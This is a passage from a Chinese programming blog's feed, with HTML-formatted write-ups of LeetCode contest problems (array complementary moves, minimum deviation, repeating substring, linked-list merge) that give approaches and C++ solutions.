class="line">解释：经过 <span class="number">1</span> 次操作，你可以将数组 nums 变成 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]（加粗元素是变更的数字）：</span><br><span class="line">nums[<span class="number">0</span>] + nums[<span class="number">3</span>] = <span class="number">1</span> + <span class="number">3</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">1</span>] + nums[<span class="number">2</span>] = <span class="number">2</span> + <span class="number">2</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">2</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">2</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">3</span>] + nums[<span class="number">0</span>] = <span class="number">3</span> + <span class="number">1</span> = <span class="number">4.</span></span><br><span class="line">对于每个 i ，nums[i] + nums[n<span class="number">-1</span>-i] = <span class="number">4</span> ，所以 nums 是互补的。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], limit = <span class="number">2</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：经过 <span class="number">2</span> 次操作，你可以将数组 nums 变成 [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>] 。你不能将任何数字变更为 <span class="number">3</span> ，因为 <span class="number">3</span> &gt; limit 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>], limit = <span class="number">2</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：nums 已经是互补的。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= limit &lt;= 105</code></li><li><code>n</code> 是偶数。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 二分查找或者查分数组。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先我们知道肯定是将数组中所有互补的元素的和最终都变为一个确定的值<code>t</code>.这是建设互补的元素为$(a,b)$,且满足$(a \le b)$,则有以下四种情况：</li></ol><ul><li>$a\ge t$: 此时我们需要将<code>a,b</code>都变为比<code>t</code>小的数，则此时需要替换的步数为<code>2</code>.</li><li>$b &lt; (t-limit)$ : 则此时我们需要将<code>a,b</code>都需要变换才能保证<code>a + b = t</code>,则此时需要变换的次数为<code>2</code>.</li><li>$a + b = t$: 此时不需要变换，则变换步数为<code>0</code>.</li><li>$ a &lt; t, b \ge (t-limit), a + b \neq t$: 则此时我们可以任意变换<code>a</code>或者<code>b</code>均可满足要求，则需要变换一次。</li></ul><ol><li>知道以上情况后，我们只需要枚举所有的目标值<code>t</code>,<code>t</code>可能的取值范围为$[2,2<em>limit]$，枚举所有的<code>t</code>然后求出最小的变换步数即可，当然如果直接求的话，时间复杂度为$O(2</em>limit*n)$,显然如果直接求的话，肯定会超时的，我们必须要转换思路。</li><li>二分查找：我们最先想到的即为二分查找，每次枚举<code>i</code>,我们将数组种互补的元素中较小的元素全部取出，然后进行排序，利用二分查找，找到大于等于<code>i</code>的元素有<code>upper</code>个;我们将数组种互补的元素中较大的元素全部取出，然后进行排序，利用二分查找，找到小于<code>i-limit</code>的元素有<code>lower</code>个.剩余的元素即为第三种和第四种情况的元素的个数的总和$n-upper-lower$，我们其中减去互补元素对的和为<code>i</code>的个数，即得到只需要变换一次的元素的个数$n-upper-lower-tot[i]$，总的时间复杂度为$O(2<em>limit</em>2*\lg{\frac{n}{2}})$。所以总的变换步数应该为:<script type="math/tex; mode=display">move = upper*2 + lower*2 + (n/2-upper-lower-tot[i]) \\= upper + lower + n/2 - tot[i]</script></li><li>前缀和：原理与二分查找类似，只不过我们可以提前求出前缀和，避免二分查找。我们用$lo[i]$表示互补数对中较小的元素序列中比<code>i</code>大的元素有多少个，用<code>hi[i]</code>表示互补数对中较大的元素序列中比<code>i</code>小的元素有多少个。这样我们通过前缀和的提前处理，可以在在枚举时$O(1)$的时间复杂度内求出变换步数，用该算法总的时间复杂度为$O(n)$,空间复杂度为$O(4*limit)$.</li><li>差分数组:后来看了解答还有更加巧妙的查分数组的解法，这个解法确实不容易想出来。<a href="https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary/solution/chai-fen-sao-miao-by-lucifer1004/" target="_blank" rel="noopener">差分数组</a><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>二分查找:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr1;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr2;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">2</span>*limit+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n/<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            arr1.push_back(min(nums[i],nums[n<span class="number">-1</span>-i]));</span><br><span class="line">            arr2.push_back(max(nums[i],nums[n<span class="number">-1</span>-i]));</span><br><span class="line">            cnt[nums[i]+nums[n<span class="number">-1</span>-i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(),arr1.end());</span><br><span class="line">        sort(arr2.begin(),arr2.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit*<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it1 = lower_bound(arr1.begin(),arr1.end(),i);</span><br><span class="line">            <span class="keyword">auto</span> it2 = lower_bound(arr2.begin(),arr2.end(),i-limit);</span><br><span class="line">            <span class="keyword">int</span> upper = arr1.end() - it1;</span><br><span class="line">            <span class="keyword">int</span> lower = it2 - arr2.begin();</span><br><span class="line">            <span class="keyword">int</span> move = upper + lower + n/<span class="number">2</span> - cnt[i];</span><br><span class="line">            ans = min(ans,move);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>前缀和：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="keyword">int</span> upper = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> lower = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; lo(limit+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; hi(limit+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tot(limit*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n/<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            lo[min(nums[i],nums[n<span class="number">-1</span>-i])]++;</span><br><span class="line">            hi[max(nums[i],nums[n<span class="number">-1</span>-i])]++;</span><br><span class="line">            tot[nums[i]+nums[n<span class="number">-1</span>-i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = limit<span class="number">-1</span>; i &gt;= <span class="number">1</span>; --i) lo[i] += lo[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit; ++i) hi[i] += hi[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit*<span class="number">2</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> upper = i &gt; limit ? <span class="number">0</span>:lo[i];</span><br><span class="line">            <span class="keyword">int</span> lower = i &lt;= limit ? <span class="number">0</span>:hi[i-limit<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">int</span> move = upper + lower + n/<span class="number">2</span> - tot[i];</span><br><span class="line">            ans = min(ans,move);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>差分数组:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; delta(limit * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> lo = <span class="number">1</span> + min(nums[i], nums[n - i - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">int</span> hi = limit + max(nums[i], nums[n - i - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">int</span> sum = nums[i] + nums[n - i - <span class="number">1</span>];</span><br><span class="line">            delta[lo]--;</span><br><span class="line">            delta[sum]--;</span><br><span class="line">            delta[sum + <span class="number">1</span>]++;</span><br><span class="line">            delta[hi + <span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> now = n;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= limit * <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            now += delta[i];</span><br><span class="line">            ans = min(ans, now);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5616-数组的最小偏移量"><a href="#5616-数组的最小偏移量" class="headerlink" title="5616. 数组的最小偏移量"></a>5616. 数组的最小偏移量</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个由<code>n</code>个正整数组成的数组<code>nums</code> 。</p><p>你可以对数组的任意元素执行任意次数的两类操作：</p><ul><li>如果元素是 偶数 ，除以 <code>2</code><br>例如，如果数组是 <code>[1,2,3,4]</code>，那么你可以对最后一个元素执行此操作，使其变成 <code>[1,2,3,2]</code></li><li>如果元素是 奇数 ，乘上 2<br>例如，如果数组是<code>[1,2,3,4]</code> ，那么你可以对第一个元素执行此操作，使其变成 <code>[2,2,3,4]</code><br>数组的 偏移量 是数组中任意两个元素之间的 最大差值 。</li></ul><p>返回数组在执行某些操作之后可以拥有的 最小偏移量 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：你可以将数组转换为 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]，然后转换成 [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]，偏移量是 <span class="number">3</span> - <span class="number">2</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：两次操作后，你可以将数组转换为 [<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>]，偏移量是 <span class="number">5</span> - <span class="number">2</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">10</span>,<span class="number">8</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们可以首先将所有数字都通过反复除以22变为奇数，然后将这些数都放入一个set中（同时记录下编号以便查询原始值）。为了减小偏移量，我们每次贪心地对最小的元素进行乘22的操作，直到不能再继续进行下去为止（最小的元素已经是偶数，并且等于其原始值）。这个过程中，set中最大元素和最小元素的最小差值就是我们要求的答案。</li><li>我们知道所有的奇数都可以变大，所有的偶数都只能变小。所以如果一个数为偶数的话，我们则可以枚举其所有可能的数，如果一个数原始为奇数，则他最多只可能变一次。</li><li>总感觉这个题目乖乖的，不太清楚考察什么思考能力？<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeviation</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">set</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; ms;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">while</span> (num % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            ms.emplace(num, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = ms.rbegin()-&gt;first - ms.begin()-&gt;first;</span><br><span class="line">        <span class="keyword">while</span> (ms.begin()-&gt;first &lt; nums[ms.begin()-&gt;second] || ms.begin()-&gt;first % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [num, idx] = *ms.begin();</span><br><span class="line">            ms.erase(ms.begin());</span><br><span class="line">            ms.emplace(num &lt;&lt; <span class="number">1</span>, idx);</span><br><span class="line">            ans = min(ans, ms.rbegin()-&gt;first - ms.begin()-&gt;first);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-217&quot;&gt;&lt;a href=&quot;#leetcode-contest-217&quot; class=&quot;headerlink&quot; title=&quot;leetcode   contest 217&quot;&gt;&lt;/a&gt;leetcode   contest 217&lt;/h1&gt;&lt;p&gt;本周周赛难度果真很大，只做出了前2题，后面2题确实很难，基本上没有什么思路。确实是非常经典的&lt;code&gt;cp&lt;/code&gt;题目，偶尔会出现难度很大的题目。&lt;/p&gt;&lt;h2 id=&quot;5613-最富有客户的资产总量&quot;&gt;&lt;a href=&quot;#5613-最富有客户的资产总量&quot; class=&quot;headerlink&quot; title=&quot;5613. 最富有客户的资产总量&quot;&gt;&lt;/a&gt;5613. 最富有客户的资产总量&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个 &lt;code&gt;m x n&lt;/code&gt;的整数网格 &lt;code&gt;accounts&lt;/code&gt;，其中 &lt;code&gt;accounts[i][j]&lt;/code&gt;是第 &lt;code&gt;i​​​​​​​​​​​​&lt;/code&gt; 位客户在第 &lt;code&gt;j&lt;/code&gt; 家银行托管的资产数量。返回最富有客户所拥有的 资产总量 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛 40</title>
    <link href="http://yoursite.com/2020/11/28/230/"/>
    <id>http://yoursite.com/2020/11/28/230/</id>
    <published>2020-11-28T15:34:15.764Z</published>
    <updated>2020-11-29T05:27:43.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekl-contest-40"><a href="#leetcode-biweekl-contest-40" class="headerlink" title="leetcode  biweekl contest 40"></a>leetcode  biweekl contest 40</h1><p>今天的双周赛的题目实在是太简单了，基本上完全没有任何难度，除了题目麻烦容易出错以外，真心特别简单，基本上没有<code>hard</code>难度，题目太没有诚意了,天冷了写代码速度都变慢了。<br><img src="https://i.loli.net/2020/11/28/UL9NKgnJsk78THv.png" alt="1"></p><h2 id="5557-最大重复子字符串"><a href="#5557-最大重复子字符串" class="headerlink" title="5557. 最大重复子字符串"></a>5557. 最大重复子字符串</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串 <code>sequence</code>，如果字符串 <code>word</code> 连续重复<code>k</code>次形成的字符串是 <code>sequence</code> 的一个子字符串，那么单词<code>word</code> 的 重复值为 k 。单词 word 的 最大重复值 是单词 <code>word</code>在 <code>sequence</code> 中最大的重复值。如果 <code>word</code>不是 <code>sequence</code>的子串，那么重复值 k 为 0 。</p><a id="more"></a><p>给你一个字符串 <code>sequence</code>和 <code>word</code>，请你返回 最大重复值 k 。</p><p>示例 1：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ab"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：<span class="string">"abab"</span> 是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ba"</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：<span class="string">"ba"</span> 是 <span class="string">"ababc"</span> 的子字符串，但 <span class="string">"baba"</span> 不是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">sequence</span> = <span class="string">"ababc"</span>, <span class="attr">word</span> = <span class="string">"ac"</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：<span class="string">"ac"</span> 不是 <span class="string">"ababc"</span> 的子字符串。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= sequence.length &lt;= 100</code></li><li><code>1 &lt;= word.length &lt;= 100</code></li><li><code>sequence</code> 和 <code>word</code> 都只包含小写英文字母</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/maximum-repeating-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/maximum-repeating-substring/</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>直接将可能的重复的次数都尝试一遍即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxRepeating</span><span class="params">(<span class="built_in">string</span> sequence, <span class="built_in">string</span> word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = sequence.size();</span><br><span class="line">        <span class="keyword">int</span> n = word.size();</span><br><span class="line">        <span class="keyword">int</span> repeat = m/n;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = repeat; i &gt;= <span class="number">1</span>; --i)&#123;</span><br><span class="line">            <span class="built_in">string</span> curr;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j) curr = curr + word;</span><br><span class="line">            <span class="keyword">if</span>(sequence.find(curr) != <span class="built_in">string</span>::npos) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5558-合并两个链表"><a href="#5558-合并两个链表" class="headerlink" title="5558. 合并两个链表"></a>5558. 合并两个链表</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你两个链表 <code>list1</code> 和 <code>list2</code>，它们包含的元素分别为 n 个和 m 个。<br>请你将 <code>list1</code>中第 a 个节点到第 b 个节点删除，并将<code>list2</code>接在被删除节点的位置。</p><p>下图中蓝色边和节点展示了操作后的结果：</p><p>请你返回结果链表的头指针。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：list1 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>], a = <span class="number">3</span>, b = <span class="number">4</span>, list2 = [<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>]</span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">5</span>]</span><br><span class="line">解释：我们删除 list1 中第三和第四个节点，并将 list2 接在该位置。上图中蓝色的边和节点为答案链表。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：list1 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], a = <span class="number">2</span>, b = <span class="number">5</span>, list2 = [<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">1000003</span>,<span class="number">1000004</span>]</span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1000000</span>,<span class="number">1000001</span>,<span class="number">1000002</span>,<span class="number">1000003</span>,<span class="number">1000004</span>,<span class="number">6</span>]</span><br><span class="line">解释：上图中蓝色的边和节点为答案链表。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>3 &lt;= list1.length &lt;= 104</code></li><li><code>1 &lt;= a &lt;= b &lt; list1.length - 1</code></li><li><code>1 &lt;= list2.length &lt;= 104</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/merge-in-between-linked-lists/" target="_blank" 